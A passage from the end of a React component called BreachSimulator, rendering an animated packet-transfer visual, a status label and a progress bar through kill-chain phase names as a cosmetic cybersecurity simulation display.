                             <AnimatePresence>
                                {packets.map(p => (
                                    <motion.div
                                        key={p.id}
                                        initial={{ y: -30, opacity: 0 }}
                                        animate={{ y: 30, opacity: 1 }}
                                        exit={{ opacity: 0 }}
                                        transition={{ duration: 0.8 }}
                                        className="absolute w-1.5 h-1.5 left-[-3px] rounded-full bg-cyber-neon"
                                    />
                                ))}
                             </AnimatePresence>
                        </div>
                        <Server size={16} className="text-red-500" />
                    </div>
                    <div className="text-[7px] font-bold text-cyber-neon mb-2">{isSimulating ? 'TRANSMITTING' : 'IDLE'}</div>
                </div>
              </div>
            </div>

            {/* Tactical Footer / Progress */}
            <div className="p-6 border-t border-white/5 bg-black/60 flex items-center justify-between">
                <div className="flex gap-10">
                    <div className="flex flex-col gap-1">
                       <span className="text-[8px] text-gray-600 font-semibold uppercase">Operation Phase</span>
                       <span className="text-xs font-semibold text-white">{phase}</span>
                    </div>
                    <div className="flex flex-col gap-1">
                       <span className="text-[8px] text-gray-600 font-semibold uppercase">Traffic Throughput</span>
                       <span className="text-xs font-semibold text-cyber-neon">{isSimulating ? '1.2 MB/s' : '0.0 MB/s'}</span>
                    </div>
                </div>
                <div className="flex gap-2">
                   {['RECON', 'WEAPON', 'DELIVERY', 'EXPLOIT', 'IMPACT'].map(p => (
                     <div key={p} className={`w-8 h-1 rounded-full transition-all duration-1000 ${
                        (phase === p) ? 'bg-red-500 shadow-[0_0_10px_#EF4444]' : 
                        scenarios[getScenario()][p].next === null || (Object.keys(scenarios[getScenario()]).indexOf(p) < Object.keys(scenarios[getScenario()]).indexOf(phase)) ? 'bg-cyber-neon' : 'bg-white/5'
                     }`} />
                   ))}
                </div>
            </div>
          </motion.div>
        </>
      )}
    </AnimatePresence>
  );
};

export default BreachSimulator;
